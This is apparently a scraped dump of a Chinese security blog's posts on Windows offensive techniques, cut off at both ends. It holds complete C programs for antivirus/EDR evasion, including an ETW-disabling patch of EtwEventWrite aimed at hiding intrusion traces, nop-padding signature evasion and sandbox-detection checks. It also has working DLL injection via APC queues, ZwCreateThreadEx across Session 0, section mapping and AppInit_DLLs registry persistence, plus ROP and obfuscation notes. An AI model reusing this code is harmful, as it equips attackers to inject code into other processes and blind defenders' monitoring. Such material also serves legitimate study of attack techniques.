lpProcName);//MessageBoxAEXTERN_C typedef int(WINAPI * fnMessageBoxA)( _In_opt_ HWND hWnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType);//ExitProcessEXTERN_C typedef VOID(WINAPI *fnExitProcess)( _In_ UINT uExitCode);int main()&#123; // 获取 自定义实现的 MyGetProcAddress 函数地址 fnGetProcAddress pfnGetProcAddress = (fnGetProcAddress)MyGetProcAddress(); // 获取 Kernel32.dll 的基址 HMODULE hKernel32 = (HMODULE)GetKernel32Address(); // 通过 GetProcAddress 获取 LoadLibraryA 函数的地址，并加载 user32.dll fnLoadLibraryA pfnLoadLibraryA=(fnLoadLibraryA)pfnGetProcAddress(hKernel32, &quot;LoadLibraryA&quot;); HMODULE hUser32 = (HMODULE)pfnLoadLibraryA(&quot;user32.dll&quot;); // 通过 GetProcAddress 获取 MessageBoxA 函数的地址，并调用该函数 fnMessageBoxA pfnMessageBoxA=(fnMessageBoxA)pfnGetProcAddress(hUser32, &quot;MessageBoxA&quot;); pfnMessageBoxA(NULL, &quot;success&quot;, &quot;Msg&quot;, MB_OK); // 通过 GetProcAddress 获取 ExitProcess 函数的地址，并调用该函数 fnExitProcess pfnExitProcess=(fnExitProcess)pfnGetProcAddress(hKernel32, &quot;ExitProcess&quot;); pfnExitProcess(0); return 0;&#125; 这段代码只是一个小demo，通过实现我们自己的GetProcAddress函数，来加载各种API函数，达到绕过导入表的目的。 花指令免杀一些厂商在检测特征码时，会存在一个偏移范围，我们只要填充垃圾数据超过这个偏移范围，就可以做到躲避检测的效果。但毕竟是猜测的偏移范围，失败的概率还是不小的。比如我们在上述获取获取 Kernel32.dll 的基址的函数中添加nop，可能会对绕过杀软有帮助 123456789101112131415161718192021222324252627282930313233343536373839DWORD dwKernel32Addr = 0;_asm &#123; push eax nop nop nop nop mov eax, dword ptr fs:[0x30] nop nop nop nop mov eax, [eax + 0x0c] nop nop nop nop mov eax, [eax + 0x1C] nop nop nop nop mov eax, [eax] nop nop nop nop mov eax, [eax + 0x08] nop nop nop nop mov dwKernel32Addr, eax nop nop nop nop pop eax&#125; 禁用ETW​ 先来了解一下什么是ETW。按照我的理解,就是windows提供的事件跟踪日志系统，用于系统和应用诊断、故障排除和性能监视，同样也可以用来监视execute-assembly等功能的行为操作。那么为了留下更少的入侵痕迹，就可以禁用ETW。 通过研究大佬的博客，ETW将TRUE布尔参数传递到nt!EtwpStopTrace函数中，以查找ETW特定结构并动态修改ntdll!ETWEventWrite立即返回从而停止跟踪日志记录。关键点就是ntdll!ETWEventWrite 先查看产生大量日志的程序是什么样子，以powershell为例 接着可以patch ntdll!EtwEventWrite函数来查看是否禁用了ETW。 在将powershell进程附加到x64dbg中，在ntdll!EtwEventWrite上下断点 一般windows api默认使用stdcall(x86)调用约定，这里x64默认使用fastcall，即寄存器传参，被调用者清理堆栈，所以我们直接返回（ret）就好。 之后F9运行,在processhacker中查看日志信息 已经读取不到所有信息。 代码： 1234567891011121314151617181920212223242526272829303132333435#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#include &lt;Tlhelp32.h&gt;int main() &#123; STARTUPINFOA si = &#123;0&#125;; PROCESS_INFORMATION pi = &#123; 0 &#125;; si.cb = sizeof(si); //启动一个 PowerShell 进程，并将进程信息保存在 pi 中 CreateProcessA(NULL, (LPSTR)&quot;powershell -NoExit&quot;, NULL, NULL, NULL, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi); //获取 ntdll.dll 中的 EtwEventWrite 函数的地址 HMODULE hNtdll = GetModuleHandleA(&quot;ntdll.dll&quot;); LPVOID pEtwEventWrite = GetProcAddress(hNtdll, &quot;EtwEventWrite&quot;); //Sleep(500); DWORD oldProtect; //ret char patch = 0xc3; //将 EtwEventWrite 函数的内存页设置为可读写执行 VirtualProtectEx(pi.hProcess, (LPVOID)pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &amp;oldProtect); //将第一个字节修改为 ret 指令 WriteProcessMemory(pi.hProcess, (LPVOID)pEtwEventWrite, &amp;patch, sizeof(char),NULL); //修改过的内存页的保护属性恢复为修改之前的状态 VirtualProtectEx(pi.hProcess, (LPVOID)pEtwEventWrite, 1, oldProtect, NULL); //ResumeThread 恢复 PowerShell 进程的执行 ResumeThread(pi.hThread); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); //FreeLibrary(hNtdll); return 0;&#125; 不过完全禁用并不是最好的想法，当防御者发现一条日志也没有，那也就说明遭到了入侵。我们要做的应该是提供虚假信息或者过滤到我们不想让防御者看到的信息 调用系统级函数直接系统调用是直接对内核系统调用等效的 WINAPI 调用。我们不调用 ntdll.dll VirtualAlloc，而是调用它在 Windows 内核中定义的内核等效 NtAlocateVirtualMemory。这就避免了EDR在用户层对ntdll的检测。 红队战术：结合直接系统调用和 sRDI 绕过 AV&#x2F;EDR |包抄 (outflank.nl) 删除或覆盖ntdll里面的hookhlldz&#x2F;RefleXXion：RefleXXion 是一个实用程序，旨在帮助绕过 AV&#x2F;EPP&#x2F;EDR 等使用的用户模式钩子。为了绕过用户模式钩子，它首先收集 LdrpThunkSignature 数组中找到的 NtOpenFile、NtCreateSection、NtOpenSection 和 NtMapViewOfSection 的系统调用号。 (github.com) EDR 并行分析 - MDSec 欺骗线程调用堆栈如何使用ThreadStackSpoofer隐藏Shellcode的内存分配行为-腾讯云开发者社区-腾讯云 (tencent.com) beacon&#x2F;shellcode 内存加密Sangfor华东天勇战队：内存规避 - FreeBuf网络安全行业门户 不使用RWX内存无可执行权限加载 ShellCode - HexNy0a - 博客园 (cnblogs.com) 作者的思路就是不将shellcode写入内存，避免检测到shellcode的特征码，接着通过解释器去解释运行shellcode，达到“不见shellcode，执行shellcode”的操作。不过从另一个角度来看，就是将shellcode写入到可读可写可执行的内存中，变为将解释器写入到可读可写可执行的内存中去。 针对沙箱检测虚拟机特征值检测是否存在 \\\\Device\\\\VBoxGuest设备文件 检测是否存在设备名包含 VBOX 关键字或者 VMWARE 关键字 检测虚拟机中特有的进程 检测是否存在虚拟机特有的注册表键值 检测是否存在虚拟机特有的文件 检测系统环境启动时间","categories":[{"name":"bypass","slug":"bypass","permalink":"https://e1ectr0nlc.github.io/categories/bypass/"}],"tags":[]},{"title":"基础ROP","slug":"Rop","date":"2023-08-15T16:00:00.000Z","updated":"2024-05-12T13:38:54.781Z","comments":true,"path":"2023/08/16/Rop/","permalink":"https://e1ectr0nlc.github.io/2023/08/16/Rop/","excerpt":"线下比赛多为AWD，涉及到逆向的知识点很少。为了在线下不坐牢指打开电脑无所事事疯狂偷吃茶歇区零食 ，来记录自己学习pwn的入门知识","text":"线下比赛多为AWD，涉及到逆向的知识点很少。为了在线下不坐牢指打开电脑无所事事疯狂偷吃茶歇区零食 ，来记录自己学习pwn的入门知识 保护Canary是一种栈溢出保护机制。在函数返回前会检查一个生成的随机数，如果随机数被垃圾数据覆盖或者被篡改，就会报错。 NX类似于Windows下的DEP，将内存页改为不可执行。将程序的.text段标记为可执行，而.data、.bss、.rodata以及堆栈区域均标记为不可执行。所以没有办法使用ret2shellcode的方法进行漏洞利用。 PIE地址随机化保护。 漏洞利用方式ret2text在我的理解中，这就是最简单的漏洞利用方式。 通过栈溢出修改函数的返回地址，也存在系统调用函数使用，同时系统调用的命令也正好是/bin/sh，获取到shell。 ret2shellcode当没有系统函数在程序中，我们只能自己写进去一个shellcode去执行。 通过在栈溢出的垃圾数据中加入shellcode，修改返回地址到shellcode的地址运行即可 ret2syscall当程序加入NX保护，同时没有系统调用函数来使用，就需要这种漏洞利用手法，通过触发0x80号中断进行系统调用。 思路如下： 将系统调用的编号存入EAX。例如要调用exec，对应的编号就是0xb。 将函数的其他参数存入寄存器。例如调用exec, eax&#x3D;0xb, ebx&#x3D;&#x2F;bin&#x2F;sh 的地址, ecx&#x3D;0, edx&#x3D;0 触发0x80中断 如何向寄存器中填入数据？需要利用gadgets（小片段）来实现 所谓的gadgets就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。 例如： 1pop eax ; ret 这段代码的作用就是将栈顶的数据弹出给eax，然后再将栈顶的数据作为返回地址返回。 我们只需要pop出栈顶的数据到对应寄存器中，接着在新的栈顶填入要ret的地址即可，就可以做到这种攻击手法。 ret2libc当程序中既没有调用system函数也没有/bin/sh字符，同时程序开启NX保护，这个时候就可以考虑使用libc当中的函数，其中封装了常用的函数，比如常用的printf，get函数。在每个libc库中的函数的偏移都是相对的，只要获取到libc的基地址，再加上函数的偏移值，就可以调用该函数。libc库中也存在字符串/bin/sh。需要注意的是不同版本的libc对应的函数偏移与不同。 如何获取libc基地址？ 首先通过延迟绑定机制获取到got表中的函数真实地址，通过查找对应libc中函数的偏移，使用真实地址减去函数偏移即可获得libc基地址。 之后通过基地址加上当前版本的函数偏移即可实现调用。","categories":[{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://e1ectr0nlc.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}],"tags":[]},{"title":"LLVM混淆与去除","slug":"llvm混淆与去除","date":"2023-08-11T16:00:00.000Z","updated":"2024-05-13T03:35:12.276Z","comments":true,"path":"2023/08/12/llvm混淆与去除/","permalink":"https://e1ectr0nlc.github.io/2023/08/12/llvm%E6%B7%B7%E6%B7%86%E4%B8%8E%E5%8E%BB%E9%99%A4/","excerpt":"国赛遇到了经过控制流平坦化的一道题。今天来记录一下LLVM环境的使用","text":"国赛遇到了经过控制流平坦化的一道题。今天来记录一下LLVM环境的使用 混淆关于混淆的环境搭建不再赘述，网上已有不少详细的说明，本篇只来介绍如何使用搭建后的环境。 控制流平坦化1clang -mllvm -fla test.cpp -o test1 可用选项 -mllvm -fla : 激活控制流平坦化 -mllvm -split : 激活基本块分割 -mllvm -split_num&#x3D;3 : 指定基本块分割的数目 例如 1clang -mllvm -fla -mllvm -split -mllvm -split_num=3 test.cpp -o test_fla 指令替换1clang -mllvm -sub test.cpp -o test2 -mllvm -sub : 激活指令替代 -mllvm -sub_loop&#x3D;3 : 混淆次数，这里一个函数会被混淆3次，默认为 1次 例如 1clang -mllvm -sub -mllvm -sub_loop=3 test.cpp -o test_sub 控制流伪造1clang -mllvm -bcf test.cpp -o test3 -mllvm -bcf : 激活虚假控制流 -mllvm -bcf_loop&#x3D;3 : 混淆次数，这里一个函数会被混淆3次，默认为 1 -mllvm -bcf_prob&#x3D;40 : 每个基本块被混淆的概率，这里每个基本块被混淆的概率为40%，默认为 30 % 例如 1clang -mllvm -bcf -mllvm -bcf_loop=3 -mllvm -bcf_prob=40 test.cpp -o test_bcf 保护全开 1clang -mllvm -bcf -mllvm -fla -mllvm -sub test.cpp -o test_bcf 去除去除控制流平坦化首先进入虚拟python环境中 1workon angr_work 接着在ida查看混淆函数的起始地址 比如我这里的函数起始地址为0x400CB0 1python3 deflat.py -f test1 --addr 0x400CB0 最后会恢复一个filename_recovered的文件，再次放入ida中查看 去除控制流伪造12python3 debogus.py -f test1 --addr 0x400D30python3 debogus.py -f test1 -s 0x400D30 这个脚本运行我自己的编译的程序失败了，估计与环境问题有关","categories":[{"name":"代码保护","slug":"代码保护","permalink":"https://e1ectr0nlc.github.io/categories/%E4%BB%A3%E7%A0%81%E4%BF%9D%E6%8A%A4/"}],"tags":[]},{"title":"APC注入","slug":"APC注入","date":"2023-07-19T16:00:00.000Z","updated":"2024-05-13T03:30:44.105Z","comments":true,"path":"2023/07/20/APC注入/","permalink":"https://e1ectr0nlc.github.io/2023/07/20/APC%E6%B3%A8%E5%85%A5/","excerpt":"APC注入利用了当前线程从中断中恢复时会检查APC队列中是否有函数未执行进行函数调用来注入。","text":"APC注入利用了当前线程从中断中恢复时会检查APC队列中是否有函数未执行进行函数调用来注入。 概念首先来了解下什么是APC技术。APC全称为异步过程调用，它允许一个线程请求另一个线程在适当的时候异步执行一个特定的函数。通俗来讲，当一个线程调用一个阻塞的系统调用时，例如SleepEx(),WaitForSingleObjectEx()等，内核态返回的时候会检查是否需要执行 apc 。在这种情况下，可以使用APC来在系统调用完成时执行一些额外的代码，而不需要等待系统调用返回。 实现思路适用程序： 1.多线程程序； 2.会调用SleepEx()、WaitForSingleObjectEx()、WaitForMultipleObjectsEx()、SignalObjectAndWait()等函数。 流程： 当EXE里某个线程执行到SleepEx()或者WaitForSingleObjectEx()时，系统就会产生一个软中断。 当线程再次被唤醒时，此线程会首先执行APC队列中的被注册的函数。 利用QueueUserAPC()这个API可以在软中断时向线程的APC队列插入一个函数指针，如果我们插入的是Loadlibrary()执行函数的话，就能达到注入DLL的目的。 代码通过快照获取属于目标进程的所有线程， 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135#include &lt;iostream&gt; #include &lt;Windows.h&gt;#include &lt;TlHelp32.h&gt;using namespace std;// 获取对应进程Id的所有线程IdBOOL GetAllThreadIdByProcessId(DWORD dwPid, DWORD** ppThreadIdList, LPDWORD pThreadIdListLength)&#123; //线程ID数组中当前的线程ID数量 DWORD dwThreadIdListLength = 0; //线程ID数组的最大容量 DWORD dwThreadIdListMaxCount = 2000; //存储线程ID的动态分配数组，通过调用VirtualAlloc分配内存 LPDWORD pThreadIdList = NULL; pThreadIdList = (LPDWORD)VirtualAlloc(NULL, dwThreadIdListMaxCount * sizeof(DWORD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (pThreadIdList == NULL) &#123; printf(&quot;[*] Create Thread Id Space Error!\\n&quot;); return FALSE; &#125; RtlZeroMemory(pThreadIdList, dwThreadIdListMaxCount * sizeof(DWORD)); THREADENTRY32 te32 = &#123; 0 &#125;; RtlZeroMemory(&amp;te32, sizeof(te32)); te32.dwSize = sizeof(te32); //创建系统中所有线程的快照 HANDLE hThreadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); if (hThreadSnapshot == NULL) &#123; printf(&quot;[*] Create Thread Snap Error!\\n&quot;); return FALSE; &#125; //遍历线程快照，获取每个线程的信息。 BOOL bRet = Thread32First(hThreadSnapshot, &amp;te32); while (bRet) &#123; //通过比较线程所属进程ID(th32OwnerProcessID)与指定进程ID(dwPid)判断是否与指定进程匹配 if (te32.th32OwnerProcessID == dwPid) &#123; if (dwThreadIdListLength &gt;= dwThreadIdListMaxCount) &#123; break; &#125; //如果匹配，则将线程ID te32.th32ThreadID 添加到线程ID数组中 pThreadIdList[dwThreadIdListLength++] = te32.th32ThreadID; &#125; bRet = Thread32Next(hThreadSnapshot, &amp;te32); &#125; //将线程ID数组的长度 dwThreadIdListLength 和指针 pThreadIdList //分别赋值给传入的参数 pThreadIdListLength 和 ppThreadIdList，以便在函数外部访问线程ID数组。 *pThreadIdListLength = dwThreadIdListLength; *ppThreadIdList = pThreadIdList; return TRUE;&#125;int main()&#123; //char szDllPath[] = &quot;F:\\\\code_py&amp;C\\\\vs2017\\\\injecte\\\\Dll1\\\\x64\\\\Release\\\\Dll1.dll&quot;; char szDllPath[] = &quot;F:\\\\code_py&amp;C\\\\vs2017\\\\injecte\\\\Dll1\\\\Debug\\\\Dll1&quot;; //进程pid DWORD dwPid = 28496 ; BOOL bRet; //所有线程id LPDWORD pThreadIdList = NULL; //线程id个数 DWORD dwThreadIdListLength = 0; //获取当前进程的所有线程 bRet = GetAllThreadIdByProcessId(dwPid, &amp;pThreadIdList, &amp;dwThreadIdListLength); if (!bRet) &#123; printf(&quot;[*] Get All Thread Id Error!\\n&quot;); return 0; &#125; // 打开进程 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid); if (hProcess == NULL) &#123; printf(&quot;[*] Open Process Error!\\n&quot;); return 0; &#125; DWORD dwDllPathLen = strlen(szDllPath) + 1; // 申请目标进程空间，用于存储DLL路径 LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, dwDllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (lpBaseAddress == NULL) &#123; printf(&quot;[*] VirtualAllocEx Error!\\n&quot;); return 0; &#125; SIZE_T dwWriten = 0; // 把DLL路径字符串写入目标进程 WriteProcessMemory(hProcess, lpBaseAddress, szDllPath, dwDllPathLen, &amp;dwWriten); if (dwWriten != dwDllPathLen) &#123; printf(&quot;[*] Write Process Memory Error!\\n&quot;); return 0; &#125; //获取LoadLibraryA的加载地址 LPVOID pLoadLibraryFunc = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;); if (pLoadLibraryFunc == NULL) &#123; printf(&quot;[*] Get Func Address Error!\\n&quot;); return 0; &#125; HANDLE hThread = NULL; // 倒序插入线程APC，可避免出现在插入时进程崩溃的现象 for (int i = dwThreadIdListLength - 1; i &gt;= 0; i--) &#123; //线程句柄 HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, pThreadIdList[i]); if (hThread) &#123; QueueUserAPC((PAPCFUNC)pLoadLibraryFunc, hThread, (ULONG_PTR)lpBaseAddress); CloseHandle(hThread); hThread = NULL; &#125; &#125; printf(&quot; Success\\n&quot;); if (hProcess) &#123; CloseHandle(hProcess); hProcess = NULL; &#125; if (pThreadIdList) &#123; VirtualFree(pThreadIdList, 0, MEM_RELEASE); pThreadIdList = NULL; &#125; ExitProcess(0); return 0;&#125; 运行目标注入程序 运行Dll注入程序 目标进程出现测试Dll","categories":[{"name":"Dll注入","slug":"Dll注入","permalink":"https://e1ectr0nlc.github.io/categories/Dll%E6%B3%A8%E5%85%A5/"}],"tags":[]},{"title":"绕过Session0进行注入","slug":"突破Session0的注入","date":"2023-07-17T16:00:00.000Z","updated":"2024-05-12T13:10:06.100Z","comments":true,"path":"2023/07/18/突破Session0的注入/","permalink":"https://e1ectr0nlc.github.io/2023/07/18/%E7%AA%81%E7%A0%B4Session0%E7%9A%84%E6%B3%A8%E5%85%A5/","excerpt":"引入Session概念后，我们无法通过注入服务进程来实现可信任进程注入。当我们尝试注入session0当中的进程通常会失败，就是因为我们所处的session与系统服务进程不在同一个session当中。","text":"引入Session概念后，我们无法通过注入服务进程来实现可信任进程注入。当我们尝试注入session0当中的进程通常会失败，就是因为我们所处的session与系统服务进程不在同一个session当中。 概念​ 首先来解释一下Session隔离机制。在Windows XP、Windows Server 2003，以及更老版本的Windows操作系统中，服务和应用程序使用相同的会话（SESSION）来运行，而这个会话是由第一个登录到控制台的用户来启动的，该会话就称为SESSION 0。将服务和用户应用程序一起在SESSION 0中运行会导致安全风险，因为服务会使用提升后的权限来运行，而用户应用程序使用用户特权（大部分都是非管理员用户）运行，这会使得恶意软件把某个服务作为攻击目标，通过“劫持”该服务以达到提升自己权限级别的目的。 ​ 从Windows VISTA开始，只有服务可以托管到SESSION 0中，用户应用程序和服务之间会进行隔离，并需要运行在用户登录系统时创建的后续会话中。如第一个登录用户创建Session 1，第二个登录用户创建Session 2，以此类推。 ​ 我们使用CreatRemoteThread在普通用户进程注入shellcode或者Dll没问题，但是想要更进一步注入到系统进程中，那么就一定会失败，就是由于Session 0隔离的缘故。我们接下来就要解决这个问题。 实现方法​ 引入Session隔离机制后，使用CreateRemoteThread创建远程线程时线程先挂起，然后判断是否运行在所属会话层后再决定是否恢复运行。 ​ ZwCreateThreadEx函数比CreateRemoteThread函数更接近内核，CreateRemoteThread最终也是调用ZwCreateThreadEx函数来创建线程的，通过前人对CreateRemoteThread逆向研究发现，在内部调ZwCreateThreadEx会把第七个参数创建标识设置为1，这样会使在系统服务创建的线程挂起，这也是注入失败的原因。 ​ 只要你学过远程线程注入就明白这个技术的实现过程，只是将CreateRemoteThread换成了ZwCreateThreadEx。 代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;//ZwCreateThreadEx的32位和64位定义#ifdef _WIN64typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, ULONG CreateThreadFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, LPVOID pUnkown);#elsetypedef DWORD(WINAPI* typedef_ZwCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, BOOL CreateSuspended, DWORD dwStackSize, DWORD dw1, DWORD dw2, LPVOID pUnkown);#endiftypedef DWORD(WINAPI* typedef_LoadLibraryA)(char* path);int main() &#123; //x64DLL路径 char DllPath[] = &quot;F:\\\\code_py&amp;C\\\\vs2017\\\\injecte\\\\Dll1\\\\x64\\\\Release\\\\Dll1.dll&quot;; //x32 //char DllPath[] = &quot;F:\\\\code_py&amp;C\\\\vs2017\\\\injecte\\\\Dll1\\\\Debug\\\\Dll1.dll&quot;; DWORD dwPid = 28496 ; HANDLE hRemoteThread; HMODULE hNtModule = GetModuleHandleA(&quot;ntdll.dll&quot;); HMODULE hKeModule = GetModuleHandleA(&quot;Kernel32.dll&quot;); typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hNtModule, &quot;ZwCreateThreadEx&quot;); typedef_LoadLibraryA myLoadLibraryA = (typedef_LoadLibraryA)GetProcAddress(hKeModule, &quot;LoadLibraryA&quot;); HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE,dwPid); LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, sizeof(DllPath) + 1, MEM_COMMIT, PAGE_READWRITE); WriteProcessMemory(hProcess, lpBaseAddress, DllPath, sizeof(DllPath), 0); ZwCreateThreadEx(&amp;hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)myLoadLibraryA, lpBaseAddress, 0, 0, 0, 0, NULL); CloseHandle(hRemoteThread); CloseHandle(hProcess); FreeLibrary(hKeModule); FreeLibrary(hNtModule); return 0;&#125;","categories":[{"name":"Dll注入","slug":"Dll注入","permalink":"https://e1ectr0nlc.github.io/categories/Dll%E6%B3%A8%E5%85%A5/"}],"tags":[]},{"title":"映射注入","slug":"映射注入","date":"2023-07-15T16:00:00.000Z","updated":"2024-05-12T13:10:28.495Z","comments":true,"path":"2023/07/16/映射注入/","permalink":"https://e1ectr0nlc.github.io/2023/07/16/%E6%98%A0%E5%B0%84%E6%B3%A8%E5%85%A5/","excerpt":"映射注入实际上的思路与远程线程注入一致，只不过映射注入改变了Dll的写入方式而已。","text":"映射注入实际上的思路与远程线程注入一致，只不过映射注入改变了Dll的写入方式而已。 概念映射注入是一种内存注入技术，创建的Mapping对象本质上属于申请一块物理内存，而物理内存又能比较方便的通过系统函数直接映射到进程的虚拟内存中，就避免使用一些经典函数例如VirtualAllocEx,WriteProcessMemory等被杀毒软件严密监控的API。 实现思路在注入进程创建mapping对象，向被映射的虚拟地址空间写入shellcode，打开被注入的进程句柄，将mapping映射到被注入进程的虚拟地址，创建远程线程调用。 代码实现12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include&lt;string.h&gt;#pragma comment(lib, &quot;OneCore.lib&quot;)// DLL pathconst char* dllPath = &quot;F:\\\\code_py&amp;C\\\\vs2017\\\\injecte\\\\Dll1\\\\Debug\\\\Dll1.dll&quot;;//const char* dllPath = &quot;F:\\\\code_py&amp;C\\\\vs2017\\\\injecte\\\\Dll1\\\\x64\\\\Release\\\\Dll1.dll&quot;;DWORD pid = 37836;int main()&#123; // 打开目标程序 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); if (!hProcess) &#123; printf(&quot;目标进程打开失败. Error code: %d\\n&quot;, GetLastError()); return -1; &#125; //创建dll路径的映射对象 HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, strlen(dllPath) + 1, NULL); if (!hMapping) &#123; printf(&quot;创建失败. Error code: %d\\n&quot;, GetLastError()); CloseHandle(hProcess); return -1; &#125; // 将文件映射到当前进程 LPVOID lpMapAddress = MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, strlen(dllPath) + 1); if (!lpMapAddress) &#123; printf(&quot;映射失败. Error code: %d\\n&quot;, GetLastError()); CloseHandle(hMapping); CloseHandle(hProcess); return -1; &#125; // 将dll路径写入映射内存 strcpy((char*)lpMapAddress, dllPath); // 目标进程中获取loadlibrary的路径 LPVOID pLoadLibraryA = (LPVOID)GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;); if (!pLoadLibraryA) &#123; printf(&quot;获取LoadLibraryA函数失败. Error code: %d\\n&quot;, GetLastError()); UnmapViewOfFile(lpMapAddress); CloseHandle(hMapping); CloseHandle(hProcess); return -1; &#125; // 将文件映射映射到远程进程 LPVOID lpRemoteMapAddress = MapViewOfFile2(hMapping, hProcess, 0, NULL, 0, 0, PAGE_READWRITE); if (!lpRemoteMapAddress) &#123; printf(&quot;Failed to map view of file in the target process. Error code: %d\\n&quot;, GetLastError()); UnmapViewOfFile(lpMapAddress); CloseHandle(hMapping); CloseHandle(hProcess); return -1; &#125; // 创建远程线程调用loadlibrary函数去加载dll HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, lpRemoteMapAddress, 0, NULL); if (!hRemoteThread) &#123; printf(&quot;Failed to create a remote thread in the target process. Error code: %d\\n&quot;, GetLastError()); UnmapViewOfFile(lpRemoteMapAddress); UnmapViewOfFile(lpMapAddress); CloseHandle(hMapping); CloseHandle(hProcess); return -1; &#125; // 等待线程运行结束 WaitForSingleObject(hRemoteThread, INFINITE); // Cleanup CloseHandle(hRemoteThread); UnmapViewOfFile(lpRemoteMapAddress); UnmapViewOfFile(lpMapAddress); CloseHandle(hMapping); CloseHandle(hProcess); return 0;&#125;","categories":[{"name":"Dll注入","slug":"Dll注入","permalink":"https://e1ectr0nlc.github.io/categories/Dll%E6%B3%A8%E5%85%A5/"}],"tags":[]},{"title":"ComRes注入","slug":"COMRes注入","date":"2023-07-12T16:00:00.000Z","updated":"2024-05-12T13:21:47.101Z","comments":true,"path":"2023/07/13/COMRes注入/","permalink":"https://e1ectr0nlc.github.io/2023/07/13/COMRes%E6%B3%A8%E5%85%A5/","excerpt":"学习下来感觉是一个用处不大、适用性很窄的一种注入手法。","text":"学习下来感觉是一个用处不大、适用性很窄的一种注入手法。 概念当被注入程序使用CoCreateInstance()这个API时，Com服务器会加载ComRes.dll到被注入程序中。只要我们替换掉这个ComRes.dll文件，就可以实现注入。ComRes.dll位于Windows 系统中C:\\WINDOWS\\system32目录下。 限制我们很容易就能看出这种注入方法的限制，只能对调用CoCreateInstance()的程序进行注入，泛用性不高。并且当程序加载过comRes.dll文件后，再进行替换也会失效，注入时机也很重要。 实现思路编写伪造Dll文件替换原文件 代码实现没有代码实现，替换个文件就不需要写代码了吧(😀笑)","categories":[{"name":"Dll注入","slug":"Dll注入","permalink":"https://e1ectr0nlc.github.io/categories/Dll%E6%B3%A8%E5%85%A5/"}],"tags":[]},{"title":"注册表注入","slug":"注册表注入","date":"2023-07-12T16:00:00.000Z","updated":"2024-05-12T13:21:43.668Z","comments":true,"path":"2023/07/13/注册表注入/","permalink":"https://e1ectr0nlc.github.io/2023/07/13/%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%B3%A8%E5%85%A5/","excerpt":"说实话，注册表是杀软严密监视的地方，我觉得现在对注册表进行的操作十有八九都会被查出来（但技术还是要学的）。","text":"说实话，注册表是杀软严密监视的地方，我觉得现在对注册表进行的操作十有八九都会被查出来（但技术还是要学的）。 概念主要依赖于两个表项，AppInit_Dlls和LoadAppInit_DLLs。AppInit_Dlls写入dll完整路径，LoadAppInit_DLLs写为1，重启后，指定DLL会注入到所有运行进程。User32.dll在被加载到进程时，会读取AppInit_Dlls表项。若有值，会调用LoadLibrary来载入这个字符串中指定的每个DLL。所以注册表注入只对加载user32.dll的进程有效。 实现思路说实话这种方法的思路也没什么好说的，甚至不需要编写程序就可以实现。 打开注册表键值如下：HKEY_LOCAL_MACHINE\\SoftWare\\MicroSoft\\Windows NT\\CurrentVersion\\Windows\\； 在上面的注册表项中操作 AppInit_DLLs 键值，在该键值中添加自己的DLL的全路径加dll名，多个DLL以逗号或者空格分开； 在该注册表项中添加键值LoadAppInit_DLLs，类型为 DWORD，并将其值置为 1 。 代码实现12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main()&#123; HKEY hKey; char csAppInitValue[] = &quot;F:\\\\code_py&amp;C\\\\vs2017\\\\injecte\\\\Dll1\\\\x64\\\\Release\\\\Dll1.dll&quot;; DWORD dwLoadAppInitValue = 1; char csSubKey[] = &quot;SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows\\\\&quot;; //打开注册表 LSTATUS lsRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L&quot;SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows&quot;, 0, KEY_READ, &amp;hKey); if (lsRet != ERROR_SUCCESS) &#123; printf(&quot;Open Key Failed....\\n&quot;); return -1; &#125; char csBuf[100] = &quot;&quot;; DWORD dwSize = 100; DWORD dwType = 0; RegQueryValueExA(hKey, &quot;AppInit_DLLs&quot;, 0, 